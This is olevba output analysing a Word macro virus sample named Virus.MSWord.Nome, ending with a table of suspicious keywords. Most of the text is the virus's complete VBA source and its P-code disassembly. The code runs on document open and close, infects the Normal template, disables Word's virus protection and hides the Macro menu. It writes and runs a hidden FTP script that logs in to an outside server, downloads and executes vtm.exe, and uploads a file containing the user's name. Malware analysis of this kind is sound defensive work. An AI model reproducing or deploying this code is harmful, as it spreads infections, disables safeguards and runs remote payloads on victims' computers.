olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nome
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nome - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VT.bas 
in file: Virus.MSWord.Nome - OLE stream: 'Macros/VBA/VT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
    Call VTI
    Call VTP
    Call VTA
    ActiveDocument.Save
End Sub

Sub AutoClose()
On Error Resume Next
    Call VTI
    Call VTP
    Call VTA
    ActiveDocument.Save
End Sub

Sub AutoNew()
On Error Resume Next
    Call VTI
End Sub
Sub AutoExit()
On Error Resume Next
    Call VTI
End Sub

Sub VTI()
On Error Resume Next
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
For i = 1 To Nor.Count
If Nor.Item(i).Name <> "VT" Then
tam = Nor.Item(i).CodeModule.CountOfLines
If tam > 0 Then
Nor.Item(i).CodeModule.DeleteLines 1, tam
End If
End If
Next
If Nor.Item("VT").Name <> "VT" Then
Doc("VT").Export "c:\VT.001"
Nor.Import "c:\VT.001"
NormalTemplate.Save
System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont") = 0
End If
If Doc.Item("VT").Name <> "VT" Then
Nor("VT").Export "c:\VT.001"
Doc.Import "c:\VT.001"
Cont = System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont")
Cont = Cont + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont") = Cont
End If
End Sub
Sub VTP()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
WordBasic.DisableAutoMacros 0
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:="MGA"
ActiveDocument.ReadOnlyRecommended = False
CommandBars("Tools").Controls("Macro").Visible = False
End Sub

Sub VTA()
On Error Resume Next
Nome = Left(Application.UserName, 4)
Qtd = System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont")
Open "c:\" & Nome & ".001" For Output As #1
Print #1, "Writer by SVX"
Print #1, "VXName: VT"
Print #1, "UserName: " & Nome
Print #1, "Contador: " & Qtd
Close #1
 
Open "c:\VT.ftp" For Output As #1
Print #1, "open ftp.hpg.com.br"
Print #1, "tlbysvx"
Print #1, "12345"
Print #1, "hash"
Print #1, "bin"
Print #1, "prompt"
Print #1, "lcd c:\"
Print #1, "mget vtm.exe"
Print #1, "send c:\" & Nome & ".001"
Print #1, "bye"
Close #1

Shell "c:\windows\ftp.exe -s:c:\VT.ftp", vbHide
Shell "c:\vtm.exe", vbHide

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nome
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/VT - 4874 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	ArgsCall (Call) VTI 0x0000 
' Line #3:
' 	ArgsCall (Call) VTP 0x0000 
' Line #4:
' 	ArgsCall (Call) VTA 0x0000 
' Line #5:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Sub AutoClose())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	ArgsCall (Call) VTI 0x0000 
' Line #11:
' 	ArgsCall (Call) VTP 0x0000 
' Line #12:
' 	ArgsCall (Call) VTA 0x0000 
' Line #13:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' Line #16:
' 	FuncDefn (Sub AutoNew())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	ArgsCall (Call) VTI 0x0000 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub AutoExit())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	ArgsCall (Call) VTI 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Sub VTI())
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Nor 
' Line #28:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Doc 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Nor 
' 	MemLd Count 
' 	For 
' Line #30:
' 	Ld i 
' 	Ld Nor 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0002 "VT"
' 	Ne 
' 	IfBlock 
' Line #31:
' 	Ld i 
' 	Ld Nor 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St tam 
' Line #32:
' 	Ld tam 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld tam 
' 	Ld i 
' 	Ld Nor 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	LitStr 0x0002 "VT"
' 	Ld Nor 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0002 "VT"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0009 "c:\VT.001"
' 	LitStr 0x0002 "VT"
' 	ArgsLd Doc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #39:
' 	LitStr 0x0009 "c:\VT.001"
' 	Ld Nor 
' 	ArgsMemCall Import 0x0001 
' Line #40:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	LitDI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x0014 "HKEY_CURRENT_USER\VT"
' 	LitStr 0x0004 "Cont"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitStr 0x0002 "VT"
' 	Ld Doc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0002 "VT"
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitStr 0x0009 "c:\VT.001"
' 	LitStr 0x0002 "VT"
' 	ArgsLd Nor 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #45:
' 	LitStr 0x0009 "c:\VT.001"
' 	Ld Doc 
' 	ArgsMemCall Import 0x0001 
' Line #46:
' 	LitStr 0x0000 ""
' 	LitStr 0x0014 "HKEY_CURRENT_USER\VT"
' 	LitStr 0x0004 "Cont"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Cont 
' Line #47:
' 	Ld Cont 
' 	LitDI2 0x0001 
' 	Add 
' 	St Cont 
' Line #48:
' 	Ld Cont 
' 	LitStr 0x0000 ""
' 	LitStr 0x0014 "HKEY_CURRENT_USER\VT"
' 	LitStr 0x0004 "Cont"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub VTP())
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #54:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #55:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #56:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0000 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0003 "MGA"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #58:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #59:
' 	EndSub 
' Line #60:
' Line #61:
' 	FuncDefn (Sub VTA())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	Ld Application 
' 	MemLd UserName 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	St Nome 
' Line #64:
' 	LitStr 0x0000 ""
' 	LitStr 0x0014 "HKEY_CURRENT_USER\VT"
' 	LitStr 0x0004 "Cont"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Qtd 
' Line #65:
' 	LitStr 0x0003 "c:\"
' 	Ld Nome 
' 	Concat 
' 	LitStr 0x0004 ".001"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "Writer by SVX"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "VXName: VT"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "UserName: "
' 	Ld Nome 
' 	Concat 
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Contador: "
' 	Ld Qtd 
' 	Concat 
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #71:
' Line #72:
' 	LitStr 0x0009 "c:\VT.ftp"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "open ftp.hpg.com.br"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "tlbysvx"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "12345"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "hash"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "bin"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "prompt"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "lcd c:\"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "mget vtm.exe"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "send c:\"
' 	Ld Nome 
' 	Concat 
' 	LitStr 0x0004 ".001"
' 	Concat 
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "bye"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #84:
' Line #85:
' 	LitStr 0x001F "c:\windows\ftp.exe -s:c:\VT.ftp"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #86:
' 	LitStr 0x000A "c:\vtm.exe"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #87:
' Line #88:
' 	EndSub 
' Line #89:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vtm.exe             |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

